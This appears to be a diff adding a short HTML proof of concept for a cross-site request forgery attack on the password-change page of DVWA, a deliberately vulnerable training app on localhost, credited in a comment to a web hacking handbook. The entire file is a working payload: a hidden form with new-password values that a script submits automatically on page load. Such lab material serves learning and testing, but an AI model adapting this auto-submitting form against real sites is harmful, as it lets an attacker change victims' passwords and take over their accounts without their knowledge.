@@ -1,0 +1,18 @@
+<html>
+<!--
+  this makes a sneaky cross-domain request to attack the
+  admin password change functionality of DVWA; borrowed from "WAHH"
+  p. 504
+-->
+<body>
+<form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+<input type="hidden" name="password_current" value="why">
+<input type="hidden" name="password_new" value="pls">
+<input type="hidden" name="password_conf" value="pls">
+<input type="hidden" name="Change" value="Change">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
